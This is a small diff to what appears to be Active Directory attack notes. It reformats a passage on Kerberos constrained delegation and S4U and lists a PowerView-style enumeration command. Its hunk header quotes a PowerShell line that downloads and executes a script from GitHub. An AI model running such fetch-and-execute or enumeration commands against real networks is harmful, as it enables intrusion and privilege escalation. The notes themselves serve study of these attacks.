@@ -711,9 +711,9 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 * * * 
 
 # Constrained Delegation
-This is when a TGT can be forwarded only to a specified Service defined in the specific User/Machine/Resource msds-allowedtodelegateto property.
+This is when a TGT can be forwarded only to a specified Service defined in the specific User/Machine *msds-allowedtodelegateto* property.
 
-It also introduces s4u - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos.
+It also introduces ```s4u``` - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos.
 
 ```Get-DomainUser –TrustedToAuth```
 
